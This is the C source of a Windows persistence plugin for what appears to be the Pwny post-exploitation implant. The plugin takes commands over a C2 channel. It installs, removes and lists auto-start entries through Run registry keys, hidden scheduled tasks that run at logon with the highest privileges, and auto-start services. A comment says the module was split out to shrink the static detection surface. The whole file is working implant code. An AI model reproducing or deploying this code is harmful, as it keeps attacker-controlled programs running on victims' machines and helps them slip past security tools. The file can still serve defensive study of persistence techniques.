/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Persist tab plugin — persistence mechanisms.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#define PERSIST_BASE 27

#define PERSIST_INSTALL \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PERSIST_BASE, \
                       API_CALL)

#define PERSIST_REMOVE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PERSIST_BASE, \
                       API_CALL + 1)

#define PERSIST_LIST \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PERSIST_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_PERSIST_TYPE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, PERSIST_BASE, API_TYPE)
#define TLV_TYPE_PERSIST_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PERSIST_BASE, API_TYPE)
#define TLV_TYPE_PERSIST_CMD   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PERSIST_BASE, API_TYPE + 1)
#define TLV_TYPE_PERSIST_GROUP TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, PERSIST_BASE, API_TYPE)

#define PERSIST_REGISTRY_HKCU  1
#define PERSIST_REGISTRY_HKLM  2
#define PERSIST_SCHTASK        3
#define PERSIST_SERVICE        4

static const char *persist_run_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

static tlv_pkt_t *persist_install(c2_t *c2)
{
    int technique;
    char name[256];
    char cmd[1024];
    HKEY hKey;
    LONG lResult;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PERSIST_TYPE, &technique) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_CMD, cmd) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    switch (technique)
    {
        case PERSIST_REGISTRY_HKCU:
        {
            lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                                    0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegOpenKeyEx HKCU failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = RegSetValueExA(hKey, name, 0, REG_SZ,
                                     (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
            RegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegSetValueEx failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            break;
        }

        case PERSIST_REGISTRY_HKLM:
        {
            lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                                    0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegOpenKeyEx HKLM failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = RegSetValueExA(hKey, name, 0, REG_SZ,
                                     (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
            RegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                log_debug("* persist: RegSetValueEx failed (%ld)\n", lResult);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            break;
        }

        case PERSIST_SCHTASK:
        {
            char schtask_cmd[2048];
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            _snprintf(schtask_cmd, sizeof(schtask_cmd),
                      "schtasks /Create /TN \"%s\" /TR \"%s\" "
                      "/SC ONLOGON /RL HIGHEST /F",
                      name, cmd);
            schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';

            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            memset(&pi, 0, sizeof(pi));

            if (!CreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
                                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                log_debug("* persist: schtasks CreateProcess failed (%lu)\n",
                          GetLastError());
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            break;
        }

        case PERSIST_SERVICE:
        {
            SC_HANDLE scm;
            SC_HANDLE svc;

            scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (scm == NULL)
            {
                log_debug("* persist: OpenSCManager failed (%lu)\n", GetLastError());
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            svc = CreateServiceA(scm, name, name,
                                 SERVICE_ALL_ACCESS,
                                 SERVICE_WIN32_OWN_PROCESS,
                                 SERVICE_AUTO_START,
                                 SERVICE_ERROR_IGNORE,
                                 cmd, NULL, NULL, NULL, NULL, NULL);

            if (svc == NULL)
            {
                log_debug("* persist: CreateService failed (%lu)\n", GetLastError());
                CloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            break;
        }

        default:
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *persist_remove(c2_t *c2)
{
    int technique;
    char name[256];
    HKEY hKey;
    LONG lResult;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PERSIST_TYPE, &technique) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_PERSIST_NAME, name) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    switch (technique)
    {
        case PERSIST_REGISTRY_HKCU:
        {
            lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                                    0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = RegDeleteValueA(hKey, name);
            RegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }
            break;
        }

        case PERSIST_REGISTRY_HKLM:
        {
            lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                                    0, KEY_SET_VALUE, &hKey);
            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            lResult = RegDeleteValueA(hKey, name);
            RegCloseKey(hKey);

            if (lResult != ERROR_SUCCESS)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }
            break;
        }

        case PERSIST_SCHTASK:
        {
            char schtask_cmd[512];
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            _snprintf(schtask_cmd, sizeof(schtask_cmd),
                      "schtasks /Delete /TN \"%s\" /F", name);
            schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';

            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            memset(&pi, 0, sizeof(pi));

            if (!CreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
                                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            WaitForSingleObject(pi.hProcess, 10000);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            break;
        }

        case PERSIST_SERVICE:
        {
            SC_HANDLE scm;
            SC_HANDLE svc;

            scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            if (scm == NULL)
            {
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            svc = OpenServiceA(scm, name, DELETE);
            if (svc == NULL)
            {
                CloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            if (!DeleteService(svc))
            {
                CloseServiceHandle(svc);
                CloseServiceHandle(scm);
                return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
            }

            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            break;
        }

        default:
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *persist_list(c2_t *c2)
{
    HKEY hKey;
    LONG lResult;
    DWORD index;
    char valueName[256];
    DWORD nameLen;
    BYTE valueData[1024];
    DWORD dataLen;
    DWORD valueType;
    tlv_pkt_t *result;

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
                            0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        for (index = 0; ; index++)
        {
            nameLen = sizeof(valueName);
            dataLen = sizeof(valueData);

            lResult = RegEnumValueA(hKey, index, valueName, &nameLen,
                                    NULL, &valueType, valueData, &dataLen);
            if (lResult != ERROR_SUCCESS)
            {
                break;
            }

            if (valueType == REG_SZ || valueType == REG_EXPAND_SZ)
            {
                tlv_pkt_t *entry = tlv_pkt_create();
                tlv_pkt_add_u32(entry, TLV_TYPE_PERSIST_TYPE, PERSIST_REGISTRY_HKCU);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_NAME, valueName);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_CMD, (char *)valueData);
                tlv_pkt_add_tlv(result, TLV_TYPE_PERSIST_GROUP, entry);
                tlv_pkt_destroy(entry);
            }
        }

        RegCloseKey(hKey);
    }

    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
                            0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        for (index = 0; ; index++)
        {
            nameLen = sizeof(valueName);
            dataLen = sizeof(valueData);

            lResult = RegEnumValueA(hKey, index, valueName, &nameLen,
                                    NULL, &valueType, valueData, &dataLen);
            if (lResult != ERROR_SUCCESS)
            {
                break;
            }

            if (valueType == REG_SZ || valueType == REG_EXPAND_SZ)
            {
                tlv_pkt_t *entry = tlv_pkt_create();
                tlv_pkt_add_u32(entry, TLV_TYPE_PERSIST_TYPE, PERSIST_REGISTRY_HKLM);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_NAME, valueName);
                tlv_pkt_add_string(entry, TLV_TYPE_PERSIST_CMD, (char *)valueData);
                tlv_pkt_add_tlv(result, TLV_TYPE_PERSIST_GROUP, entry);
                tlv_pkt_destroy(entry);
            }
        }

        RegCloseKey(hKey);
    }

    return result;
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, PERSIST_INSTALL, (api_t)persist_install);
    api_call_register(api_calls, PERSIST_REMOVE, (api_t)persist_remove);
    api_call_register(api_calls, PERSIST_LIST, (api_t)persist_list);
}

#endif
